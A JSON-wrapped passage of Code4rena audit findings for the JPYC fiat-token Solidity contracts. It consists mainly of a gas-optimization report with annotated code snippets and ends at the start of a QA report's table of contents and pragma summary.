[Unchecked block L326](#unchecked-block-l326)\n      - [Cache `balances[from]`](#cache-balancesfrom-1)\n    - [function burn()](#function-burn-1)\n      - [Unchecked block L382](#unchecked-block-l382)\n    - [function updateMasterMinter()](#function-updatemasterminter-1)\n      - [Emitting a storage value (`masterMinter` vs `_newMasterMinter`)](#emitting-a-storage-value-masterminter-vs-_newmasterminter-1)\n    - [function _decreaseAllowance()](#function-_decreaseallowance-1)\n      - [Unchecked block L460](#unchecked-block-l460)\n      - [Cache `allowedowner`](#cache-allowedowner-1)\n    - [function updateWhitelister()](#function-updatewhitelister)\n      - [Emitting a storage value (`whitelister` vs `_newWhitelister`)](#emitting-a-storage-value-whitelister-vs-_newwhitelister)\n  - [General recommendations](#general-recommendations)\n    - [Variables](#variables)\n      - [No need to explicitly initialize variables with default values](#no-need-to-explicitly-initialize-variables-with-default-values)\n      - [Pre-increments cost less gas compared to post-increments](#pre-increments-cost-less-gas-compared-to-post-increments)\n    - [Comparisons](#comparisons)\n      - [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof)\n    - [Visibility](#visibility)\n    - [Errors](#errors)\n      - [Reduce the size of error messages (Long revert Strings)](#reduce-the-size-of-error-messages-long-revert-strings)\n      - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)\n\n## Foreword\n\n- **Storage-reading optimizations**\n\n> The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). In the paragraphs below, please see the `@audit-issue` tags in the pieces of code's comments for more information about SLOADs that could be saved by caching the mentioned **storage** variables in **memory** variables.\n\n- **Unchecking arithmetics operations that can't underflow/overflow**\n\n> Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation, or the operation doesn't depend on user input), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## File: ERC1967Proxy.sol\n\n### function _implementation()\n\n```\nFile: ERC1967Proxy.sol\n30:     function _implementation() internal view virtual override returns (address impl) {\n31:         return ERC1967Upgrade._getImplementation(); //@audit unused named returns\n32:     }\n```\n\n#### Using both named returns and a return statement isn't necessary\n\nRemoving unused named returns variables can reduce gas usage (MSTOREs/MLOADs) and improve code clarity. To save gas and improve code quality: consider using only one of those.\n\n## File: UUPSUpgradeable.sol\n\n### function upgradeToAndCall()\n\n```\nFile: UUPSUpgradeable.sol\n095:     function upgradeToAndCall(address newImplementation, bytes memory data) //@audit can be calldata\n096:         external\n097:         payable\n098:         virtual\n099:         onlyProxy\n100:     {\n101:         _authorizeUpgrade(newImplementation);\n102:         _upgradeToAndCallUUPS(newImplementation, data, true);\n103:     }\n```\n\n### Use `calldata` instead of `memory` for external functions where the function argument is read-only\n\nHere, `bytes memory data` should be `bytes calldata data`\n\n## File: Blocklistable.sol\n\n### function updateBlocklister()\n\n```\nFile: Blocklistable.sol\n90:     function updateBlocklister(address _newBlocklister) external onlyOwner {\n91:         require(\n92:             _newBlocklister != address(0),\n93:             \"Blocklistable: new blocklister is the zero address\"\n94:         );\n95:         blocklister = _newBlocklister;\n96:         emit BlocklisterChanged(blocklister); //@audit emitting storage value\n97:     }\n```\n\n#### Emitting a storage value (`blocklister` vs `_newBlocklister`)\n\nI suggest going from\n\n```\n96:         emit BlocklisterChanged(blocklister);\n```\n\nto\n\n```\n96:         emit BlocklisterChanged(_newBlocklister);\n```\n\n## File: EIP3009.sol\n\n### function _requireValidAuthorization()\n\n```\nFile: EIP3009.sol\n219:     function _requireValidAuthorization(\n220:         address authorizer,\n221:         bytes32 nonce,\n222:         uint256 validAfter,\n223:         uint256 validBefore\n224:     ) private view {\n225:         require(\n226:             block.timestamp > validAfter, //@audit make it inclusive\n227:             \"FEIP3009: authorization is not yet valid\"\n228:         );\n229:         require(\n230:             block.timestamp < validBefore,//@audit make it inclusive\n231:             \"EIP3009: authorization is expired\"\n232:         );\n233:         _requireUnusedAuthorization(authorizer, nonce);\n234:     }\n```\n\n#### Non-strict inequalities are cheaper than strict ones (1)\n\nIt's possible to save 3 gas on `block.timestamp > validAfter` by making it inclusive: `block.timestamp >= validAfter`. I believe it wouldn't change much functionally here.\n\n#### Non-strict inequalities are cheaper than strict ones (2)\n\nIt's possible to save 3 gas on `block.timestamp < validBefore` by making it inclusive: `block.timestamp <= validBefore`. I believe it wouldn't change much functionally here.\n\n## File: FiatTokenV1.sol\n\n### function initialize()\n\n#### Use `tokenName` instead of `name`\n\nThis can save 2 SLOADs (around 200 gas).\nReplace:\n\n```\nFile: FiatTokenV1.sol\n96:         name = tokenName;\n...\n105:         DOMAIN_SEPARATOR = EIP712.makeDomainSeparator(name, \"1\"); //@audit name SLOAD \n106:         CHAIN_ID = block.chainid;\n107:         NAME = name;//@audit name SLOAD\n```\n\nwith\n\n```\n105:         DOMAIN_SEPARATOR = EIP712.makeDomainSeparator(tokenName, \"1\"); //@audit tokenName MLOAD \n...\n107:         NAME = tokenName;//@audit tokenName MLOAD\n```\n\nAdditionally, `EIP712.makeDomainSeparator()` signature is as such:\n\n```\nFile: EIP712.sol\n40:     function makeDomainSeparator(string memory name, string memory version)\n```\n\nAs the first argument is a `memory` and not a `storage`, passing the storage `name` instead of the memory `tokenName` would imply another copy in memory\n\n### function mint()\n\n```\nFile: FiatTokenV1.sol\n127:     function mint(address _to, uint256 _amount)\n...\n139:         require(\n140:             _amount <= mintingAllowedAmount,\n...\n146:         minterAllowed[msg.sender] = mintingAllowedAmount - _amount;//@audit should be unchecked (see L140)\n\n```\n\n#### Unchecked block L146\n\nThis line can't underflow due to L140. Therefore, it should be wrapped in an `unchecked` block.\n\n### function transferFrom()\n\n```\nFile: FiatTokenV1.sol\n258:     function transferFrom(\n...\n271:         require(\n272:             value <= allowed[from][msg.sender], //@audit allowed[from][msg.sender] SLOAD 1\n273:             \"ERC20: transfer amount exceeds allowance\"\n274:         );\n275:         _transfer(from, to, value);\n276:         allowed[from][msg.sender] = allowed[from][msg.sender] - value; //@audit should be unchecked (see L272) //@audit allowed[from][msg.sender] SLOAD 2\n```\n\n#### Unchecked block L276\n\nThis line can't underflow due to L272. Therefore, it should be wrapped in an `unchecked` block.\n\n#### Cache `allowed[from][msg.sender]`\n\nCaching this in memory can save around 1 SLOAD.\nThis is similar to an already implemented optimization in `L361: function burn()` for `uint256 balance = balances[msg.sender]`\n\n### function _transfer()\n\n```\nFile: FiatTokenV1.sol\n304:     function _transfer(\n...\n311:         require(\n312:             value <= balances[from],//@audit SLOAD 1\n313:             \"ERC20: transfer amount exceeds balance\"\n314:         );\n315: \n316:         balances[from] = balances[from] - value; //@audit should be unchecked (see L312) //@audit SLOAD 2\n317:         balances[to] = balances[to] + value;\n```\n\n#### Unchecked block L316\n\nThis line can't underflow due to L312. Therefore, it should be wrapped in an `unchecked` block.\n\n#### Cache `balances[from]`\n\nCaching this in memory can save around 1 SLOAD.\nThis is similar to an already implemented optimization in `L361: function burn()` for `uint256 balance = balances[msg.sender]`\n\n### function burn()\n\n```\nFile: FiatTokenV1.sol\n361:     function burn(uint256 _amount)\n...\n369:         require(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\n370: \n371:         totalSupply_ = totalSupply_ - _amount;\n372:         balances[msg.sender] = balance - _amount; //@audit should be unchecked (see L369)\n```\n\n#### Unchecked block L372\n\nThis line can't underflow due to L369. Therefore, it should be wrapped in an `unchecked` block.\n\n### function updateMasterMinter()\n\n```\nFile: FiatTokenV1.sol\n377:     function updateMasterMinter(address _newMasterMinter) external onlyOwner {\n378:         require(\n379:             _newMasterMinter != address(0),\n380:             \"FiatToken: new masterMinter is the zero address\"\n381:         );\n382:         masterMinter = _newMasterMinter;\n383:         emit MasterMinterChanged(masterMinter); //@audit emitting storage value\n384:     }\n```\n\n#### Emitting a storage value (`masterMinter` vs `_newMasterMinter`)\n\nI suggest going from\n\n```\n383:         emit MasterMinterChanged(masterMinter);\n```\n\nto\n\n```\n383:         emit MasterMinterChanged(_newMasterMinter);\n```\n\n### function _decreaseAllowance()\n\n```\nFile: FiatTokenV1.sol\n440:     function _decreaseAllowance(\n...\n445:         require(\n446:             decrement <= allowed[owner][spender],//@audit SLOAD 1\n447:             \"ERC20: decreased allowance below zero\"\n448:         );\n449:         _approve(owner, spender, allowed[owner][spender] - decrement); //@audit should be unchecked (see L446) //@audit SLOAD 2\n450:     }\n```\n\n#### Unchecked block L449\n\nThis line can't underflow due to L446. Therefore, it should be wrapped in an `unchecked` block.\n\n#### Cache `allowed[owner][spender]`\n\nCaching this in memory can save around 1 SLOAD.\nThis is similar to an already implemented optimization in `L361: function burn()` for `uint256 balance = balances[msg.sender]`\n\n## File: FiatTokenV2.sol\n\n### function initialize()\n\n#### Use `tokenName` instead of `name`\n\nThis can save 2 SLOADs (around 200 gas).\nThe explanation is the same as [Use `tokenName` instead of `name`](#use-tokenname-instead-of-name)\n\n### function mint()\n\n```\nFile: FiatTokenV2.sol\n133:     function mint(address _to, uint256 _amount)\n...\n146:         require(\n147:             _amount <= mintingAllowedAmount,\n...\n153:         minterAllowed[msg.sender] = mintingAllowedAmount - _amount; //@audit should be unchecked (see L147)\n```\n\n#### Unchecked block L153\n\nThis line can't underflow due to L147. Therefore, it should be wrapped in an `unchecked` block.\n\n### function transferFrom()\n\n```\nFile: FiatTokenV2.sol\n266:     function transferFrom(\n...\n280:         require(\n281:             value <= allowed[from][msg.sender],//@audit allowed[from][msg.sender] SLOAD 1\n...\n285:         allowed[from][msg.sender] = allowed[from][msg.sender] - value; //@audit should be unchecked (see L281) //@audit allowed[from][msg.sender] SLOAD 2\n```\n\n#### Unchecked block L285\n\nThis line can't underflow due to L281. Therefore, it should be wrapped in an `unchecked` block.\n\n#### Cache `allowed[from][msg.sender]`\n\nCaching this in memory can save around 1 SLOAD.\n\n### function _transfer()\n\n```\nFile: FiatTokenV2.sol\n314:     function _transfer(\n...   \n321:         require(\n322:             value <= balances[from],//@audit SLOAD 1\n323:             \"ERC20: transfer amount exceeds balance\" \n...\n326:         balances[from] = balances[from] - value; //@audit should be unchecked (see L322) //@audit SLOAD 2\n```\n\n#### Unchecked block L326\n\nThis line can't underflow due to L322. Therefore, it should be wrapped in an `unchecked` block.\n\n#### Cache `balances[from]`\n\nCaching this in memory can save around 1 SLOAD.\n\n### function burn()\n\n```\nFile: FiatTokenV2.sol\n371:     function burn(uint256 _amount)\n...\n379:         require(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\n...\n382:         balances[msg.sender] = balance - _amount; //@audit should be unchecked (see L379)\n\n```\n\n#### Unchecked block L382\n\nThis line can't underflow due to L379. Therefore, it should be wrapped in an `unchecked` block.\n\n### function updateMasterMinter()\n\n```\nFile: FiatTokenV2.sol\n387:     function updateMasterMinter(address _newMasterMinter) external onlyOwner {\n388:         require(\n389:             _newMasterMinter != address(0),\n390:             \"FiatToken: new masterMinter is the zero address\"\n391:         );\n392:         masterMinter = _newMasterMinter;\n393:         emit MasterMinterChanged(masterMinter);\n394:     }\n```\n\n#### Emitting a storage value (`masterMinter` vs `_newMasterMinter`)\n\nI suggest going from\n\n```\n393:         emit MasterMinterChanged(masterMinter);\n```\n\nto\n\n```\n393:         emit MasterMinterChanged(_newMasterMinter);\n```\n\n### function _decreaseAllowance()\n\n```\nFile: FiatTokenV2.sol\n451:     function _decreaseAllowance(\n452:         address owner,\n453:         address spender,\n454:         uint256 decrement\n455:     ) internal override {\n456:         require(\n457:             decrement <= allowed[owner][spender],//@audit SLOAD 1\n458:             \"ERC20: decreased allowance below zero\" \n459:         );\n460:         _approve(owner, spender, allowed[owner][spender] - decrement); //@audit should be unchecked (see L457) //@audit SLOAD 2\n461:     }\n```\n\n#### Unchecked block L460\n\nThis line can't underflow due to L457. Therefore, it should be wrapped in an `unchecked` block.\n\n#### Cache `allowed[owner][spender]`\n\nCaching this in memory can save around 1 SLOAD.\n\n### function updateWhitelister()\n\n```\nFile: FiatTokenV2.sol\n659:     function updateWhitelister(address _newWhitelister) external onlyOwner {\n660:         require(\n661:             _newWhitelister != address(0),\n662:             \"Whitelistable: new whitelister is the zero address\"\n663:         );\n664:         whitelister = _newWhitelister;\n665:         emit WhitelisterChanged(whitelister); //@audit emitting storage value\n666:     }\n```\n\n#### Emitting a storage value (`whitelister` vs `_newWhitelister`)\n\nI suggest going from\n\n```\n665:         emit WhitelisterChanged(whitelister);\n```\n\nto\n\n```\n665:         emit WhitelisterChanged(_newWhitelister);\n```\n\n## General recommendations\n\n### Variables\n\n#### No need to explicitly initialize variables with default values\n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:  \n\n```\nv1/FiatTokenV1.sol:58:    uint256 internal totalSupply_ = 0;\nv1/Pausable.sol:49:    bool public paused = false;\nv2/FiatTokenV2.sol:58:    uint256 internal totalSupply_ = 0;\n```\n\nI suggest removing explicit initializations for default values.\n\n#### Pre-increments cost less gas compared to post-increments\n\n### Comparisons\n\n#### `> 0` is less efficient than `!= 0` for unsigned integers (with proof)\n\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```\nv1/FiatTokenV1.sol:136:        require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\nv1/FiatTokenV1.sol:368:        require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\nv2/FiatTokenV2.sol:143:        require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\nv2/FiatTokenV2.sol:378:        require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\n```\n\nAlso, please enable the Optimizer.\n\n### Visibility\n\n### Errors\n\n#### Reduce the size of error messages (Long revert Strings)\n\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nStrings > 32 bytes:\n\n```\nupgradeability/ERC1967Upgrade.sol:45:        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\nupgradeability/ERC1967Upgrade.sol:92:                require(slot == _IMPLEMENTATION_SLOT, \"ERC1967Upgrade: unsupported proxiableUUID\");\nupgradeability/ERC1967Upgrade.sol:94:                revert(\"ERC1967Upgrade: new implementation is not UUPS\");\nupgradeability/UUPSUpgradeable.sol:35:            \"Function must be called through delegatecall\"\nupgradeability/UUPSUpgradeable.sol:39:            \"Function must be called through active proxy\"\nupgradeability/UUPSUpgradeable.sol:51:            \"UUPSUpgradeable: must not be called through delegatecall\"\nutil/Address.sol:59:        require(success, \"Address: unable to send value, recipient may have reverted\");\nutil/Address.sol:114:        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\nutil/Address.sol:129:        require(address(this).balance >= value, \"Address: insufficient balance for call\");\nutil/Address.sol:143:        return functionStaticCall(target, data, \"Address: low-level static call failed\");\nutil/Address.sol:157:        require(isContract(target), \"Address: static call to non-contract\");\nutil/Address.sol:170:        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\nutil/Address.sol:184:        require(isContract(target), \"Address: delegate call to non-contract\");\nutil/ECRecover.sol:62:            revert(\"ECRecover: invalid signature 's' value\");\nutil/ECRecover.sol:66:            revert(\"ECRecover: invalid signature 'v' value\");\nutil/SafeERC20.sol:55:            \"SafeERC20: approve from non-zero to non-zero allowance\"\nutil/SafeERC20.sol:76:            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\nutil/SafeERC20.sol:96:            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\nutil/StorageSlot.sol:23: *         require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\nv1/Blocklistable.sol:47:            \"Blocklistable: caller is not the blocklister\"\nv1/Blocklistable.sol:59:            \"Blocklistable: account is blocklisted\"\nv1/Blocklistable.sol:93:            \"Blocklistable: new blocklister is the zero address\"\nv1/EIP3009.sol:145:        require(to == msg.sender, \"EIP3009: caller must be the payee\");\nv1/EIP3009.sol:208:            \"EIP3009: authorization is used or canceled\"\nv1/EIP3009.sol:227:            \"FEIP3009: authorization is not yet valid\"\nv1/EIP3009.sol:231:            \"EIP3009: authorization is expired\"\nv1/FiatTokenV1.sol:78:        require(!initialized, \"FiatToken: contract is already initialized\");\nv1/FiatTokenV1.sol:81:            \"FiatToken: new masterMinter is the zero address\"\nv1/FiatTokenV1.sol:85:            \"FiatToken: new pauser is the zero address\"\nv1/FiatTokenV1.sol:89:            \"FiatToken: new blocklister is the zero address\"\nv1/FiatTokenV1.sol:93:            \"FiatToken: new owner is the zero address\"\nv1/FiatTokenV1.sol:116:        require(minters[msg.sender], \"FiatToken: caller is not a minter\");\nv1/FiatTokenV1.sol:135:        require(_to != address(0), \"FiatToken: mint to the zero address\");\nv1/FiatTokenV1.sol:136:        require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\nv1/FiatTokenV1.sol:141:            \"FiatToken: mint amount exceeds minterAllowance\"\nv1/FiatTokenV1.sol:158:            \"FiatToken: caller is not the masterMinter\"\nv1/FiatTokenV1.sol:245:        require(owner != address(0), \"ERC20: approve from the zero address\");\nv1/FiatTokenV1.sol:246:        require(spender != address(0), \"ERC20: approve to the zero address\");\nv1/FiatTokenV1.sol:273:            \"ERC20: transfer amount exceeds allowance\"\nv1/FiatTokenV1.sol:309:        require(from != address(0), \"ERC20: transfer from the zero address\");\nv1/FiatTokenV1.sol:310:        require(to != address(0), \"ERC20: transfer to the zero address\");\nv1/FiatTokenV1.sol:313:            \"ERC20: transfer amount exceeds balance\"\nv1/FiatTokenV1.sol:368:        require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\nv1/FiatTokenV1.sol:369:        require(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\nv1/FiatTokenV1.sol:380:            \"FiatToken: new masterMinter is the zero address\"\nv1/FiatTokenV1.sol:447:            \"ERC20: decreased allowance below zero\"\nv1/Ownable.sol:52:        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\nv1/Pausable.sol:63:        require(msg.sender == pauser, \"Pausable: caller is not the pauser\");\nv1/Pausable.sol:89:            \"Pausable: new pauser is the zero address\"\nv1/Rescuable.sol:50:        require(msg.sender == _rescuer, \"Rescuable: caller is not the rescuer\");\nv1/Rescuable.sol:75:            \"Rescuable: new rescuer is the zero address\"\nv2/FiatTokenV2.sol:84:        require(!initialized, \"FiatToken: contract is already initialized\");\nv2/FiatTokenV2.sol:87:            \"FiatToken: new masterMinter is the zero address\"\nv2/FiatTokenV2.sol:91:            \"FiatToken: new pauser is the zero address\"\nv2/FiatTokenV2.sol:95:            \"FiatToken: new blocklister is the zero address\"\nv2/FiatTokenV2.sol:99:            \"FiatToken: new owner is the zero address\"\nv2/FiatTokenV2.sol:122:        require(minters[msg.sender], \"FiatToken: caller is not a minter\");\nv2/FiatTokenV2.sol:142:        require(_to != address(0), \"FiatToken: mint to the zero address\");\nv2/FiatTokenV2.sol:143:        require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\nv2/FiatTokenV2.sol:148:            \"FiatToken: mint amount exceeds minterAllowance\"\nv2/FiatTokenV2.sol:165:            \"FiatToken: caller is not the masterMinter\"\nv2/FiatTokenV2.sol:253:        require(owner != address(0), \"ERC20: approve from the zero address\");\nv2/FiatTokenV2.sol:254:        require(spender != address(0), \"ERC20: approve to the zero address\");\nv2/FiatTokenV2.sol:282:            \"ERC20: transfer amount exceeds allowance\"\nv2/FiatTokenV2.sol:319:        require(from != address(0), \"ERC20: transfer from the zero address\");\nv2/FiatTokenV2.sol:320:        require(to != address(0), \"ERC20: transfer to the zero address\");\nv2/FiatTokenV2.sol:323:            \"ERC20: transfer amount exceeds balance\"\nv2/FiatTokenV2.sol:378:        require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\nv2/FiatTokenV2.sol:379:        require(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\nv2/FiatTokenV2.sol:390:            \"FiatToken: new masterMinter is the zero address\"\nv2/FiatTokenV2.sol:458:            \"ERC20: decreased allowance below zero\"\nv2/FiatTokenV2.sol:613:            \"Whitelistable: caller is not the whitelister\"\nv2/FiatTokenV2.sol:627:                \"Whitelistable: account is not whitelisted\"\nv2/FiatTokenV2.sol:662:            \"Whitelistable: new whitelister is the zero address\" \n```\n\nI suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next.\n\n#### Use Custom Errors instead of Revert Strings to save Gas\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include:\n\n```\n78 results - 14 files\n\ncontracts/upgradeability/ERC1967Upgrade.sol:\n  45:         require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n  92:                 require(slot == _IMPLEMENTATION_SLOT, \"ERC1967Upgrade: unsupported proxiableUUID\");\n\ncontracts/upgradeability/UUPSUpgradeable.sol:\n  33:         require(\n  37:         require(\n  49:         require(\n\ncontracts/util/Address.sol:\n   56:         require(address(this).balance >= amount, \"Address: insufficient balance\");\n   59:         require(success, \"Address: unable to send value, recipient may have reverted\");\n  129:         require(address(this).balance >= value, \"Address: insufficient balance for call\");\n  130:         require(isContract(target), \"Address: call to non-contract\");\n  157:         require(isContract(target), \"Address: static call to non-contract\");\n  184:         require(isContract(target), \"Address: delegate call to non-contract\");\n\ncontracts/util/ECRecover.sol:\n  71:         require(signer != address(0), \"ECRecover: invalid signature\");\n\ncontracts/util/SafeERC20.sol:\n  53:         require(\n  76:             require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\n  96:             require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n\ncontracts/util/StorageSlot.sol:\n  23:  *         require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n\ncontracts/v1/Blocklistable.sol:\n  45:         require(\n  57:         require(\n  91:         require(\n\ncontracts/v1/EIP2612.sol:\n  70:         require(deadline >= block.timestamp, \"EIP2612: permit is expired\");\n  80:         require(\n\ncontracts/v1/EIP3009.sol:\n  111:         require(\n  145:         require(to == msg.sender, \"EIP3009: caller must be the payee\");\n  157:         require(\n  188:         require(\n  206:         require(\n  225:         require(\n  229:         require(\n\ncontracts/v1/FiatTokenV1.sol:\n   78:         require(!initialized, \"FiatToken: contract is already initialized\");\n   79:         require(\n   83:         require(\n   87:         require(\n   91:         require(\n  116:         require(minters[msg.sender], \"FiatToken: caller is not a minter\");\n  135:         require(_to != address(0), \"FiatToken: mint to the zero address\");\n  136:         require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\n  139:         require(\n  156:         require(\n  245:         require(owner != address(0), \"ERC20: approve from the zero address\");\n  246:         require(spender != address(0), \"ERC20: approve to the zero address\");\n  271:         require(\n  309:         require(from != address(0), \"ERC20: transfer from the zero address\");\n  310:         require(to != address(0), \"ERC20: transfer to the zero address\");\n  311:         require(\n  368:         require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\n  369:         require(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\n  378:         require(\n  445:         require(\n\ncontracts/v1/Ownable.sol:\n  43:         require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n  52:         require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n\ncontracts/v1/Pausable.sol:\n  55:         require(!paused, \"Pausable: paused\");\n  63:         require(msg.sender == pauser, \"Pausable: caller is not the pauser\");\n  87:         require(\n\ncontracts/v1/Rescuable.sol:\n  50:         require(msg.sender == _rescuer, \"Rescuable: caller is not the rescuer\");\n  73:         require(\n\ncontracts/v2/FiatTokenV2.sol:\n   84:         require(!initialized, \"FiatToken: contract is already initialized\");\n   85:         require(\n   89:         require(\n   93:         require(\n   97:         require(\n  122:         require(minters[msg.sender], \"FiatToken: caller is not a minter\");\n  142:         require(_to != address(0), \"FiatToken: mint to the zero address\");\n  143:         require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\n  146:         require(\n  163:         require(\n  253:         require(owner != address(0), \"ERC20: approve from the zero address\"); \n  254:         require(spender != address(0), \"ERC20: approve to the zero address\"); \n  280:         require(\n  319:         require(from != address(0), \"ERC20: transfer from the zero address\"); \n  320:         require(to != address(0), \"ERC20: transfer to the zero address\");     \n  321:         require(\n  378:         require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\n  379:         require(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\n  388:         require(\n  456:         require(\n  611:         require(\n  625:             require(\n  660:         require(\n```\n\nI suggest replacing revert strings with custom errors.\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/27"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n**Table of Contents:**\n\n- [QA Report](#qa-report)\n  - [Foreword](#foreword)\n  - [Summary](#summary)\n  - [File: UUPSUpgradeable.sol](#file-uupsupgradeablesol)\n    - [modifier onlyProxy()](#modifier-onlyproxy)\n      - [Missing `UUPSUpgradeable:` prefix on revert string `Function must be called through delegatecall`](#missing-uupsupgradeable-prefix-on-revert-string-function-must-be-called-through-delegatecall)\n      - [Missing `UUPSUpgradeable:` prefix on revert string `Function must be called through active proxy`](#missing-uupsupgradeable-prefix-on-revert-string-function-must-be-called-through-active-proxy)\n  - [File: Blocklistable.sol](#file-blocklistablesol)\n    - [function isBlocklisted()](#function-isblocklisted)\n      - [Missing comment `@return bool`](#missing-comment-return-bool)\n  - [File: FiatTokenV1.sol](#file-fiattokenv1sol)\n    - [Storage](#storage)\n      - [Related data should be grouped in a struct](#related-data-should-be-grouped-in-a-struct)\n    - [function initialize()](#function-initialize)\n      - [Front-Runnable initialize()](#front-runnable-initialize)\n    - [function minterAllowance()](#function-minterallowance)\n      - [Missing comment `@return uint256`](#missing-comment-return-uint256)\n    - [function isMinter()](#function-isminter)\n      - [Missing comment `@return bool`](#missing-comment-return-bool-1)\n    - [function balanceOf()](#function-balanceof)\n      - [Missing comment `@return uint256`](#missing-comment-return-uint256-1)\n  - [File: FiatTokenV2.sol](#file-fiattokenv2sol)\n    - [Storage](#storage-1)\n      - [Related data should be grouped in a struct](#related-data-should-be-grouped-in-a-struct-1)\n    - [function initialize()](#function-initialize-1)\n      - [Front-Runnable initialize()](#front-runnable-initialize-1)\n    - [function minterAllowance()](#function-minterallowance-1)\n      - [Missing comment `@return uint256`](#missing-comment-return-uint256-2)\n    - [function isMinter()](#function-isminter-1)\n      - [Missing comment `@return bool`](#missing-comment-return-bool-2)\n    - [function balanceOf()](#function-balanceof-1)\n      - [Missing comment `@return uint256`](#missing-comment-return-uint256-3)\n    - [function _approve()](#function-_approve)\n      - [Wrong revert string prefix (1)](#wrong-revert-string-prefix-1)\n      - [Wrong revert string prefix (2)](#wrong-revert-string-prefix-2)\n    - [function transferFrom()](#function-transferfrom)\n      - [Wrong revert string prefix](#wrong-revert-string-prefix)\n    - [function _transfer()](#function-_transfer)\n      - [Wrong revert string prefix (1)](#wrong-revert-string-prefix-1-1)\n      - [Wrong revert string prefix (2)](#wrong-revert-string-prefix-2-1)\n      - [Wrong revert string prefix (3)](#wrong-revert-string-prefix-3)\n    - [function _decreaseAllowance()](#function-_decreaseallowance)\n      - [Wrong revert string prefix](#wrong-revert-string-prefix-1)\n    - [modifier onlyWhitelister()](#modifier-onlywhitelister)\n      - [Wrong revert string prefix](#wrong-revert-string-prefix-2)\n    - [modifier checkWhitelist()](#modifier-checkwhitelist)\n      - [Wrong revert string prefix](#wrong-revert-string-prefix-3)\n    - [function isWhitelisted()](#function-iswhitelisted)\n      - [Missing comment `@return bool`](#missing-comment-return-bool-3)\n    - [function updateWhitelister()](#function-updatewhitelister)\n      - [Wrong revert string prefix](#wrong-revert-string-prefix-4)\n  - [File: Ownable.sol](#file-ownablesol)\n    - [function transferOwnership()](#function-transferownership)\n      - [transferOwnership should be two step process](#transferownership-should-be-two-step-process)\n\n## Foreword\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## Summary\n\n- The pragmas used are not the same everywhere:\n\n```\nproxy/ERC1967Proxy.sol:4:pragma solidity ^0.8.0;\nproxy/Proxy.sol:4:pragma solidity ^0.8.0;\nupgradeability/draft-IERC1822.sol:4:pragma solidity ^0.8.0;\nupgradeability/ERC1967Upgrade.sol:4:pragma solidity 0.8.11;\nupgradeability/UUPSUpgradeable.sol:4:pragma solidity 0.8.11;\nutil/Address.sol:4:pragma solidity 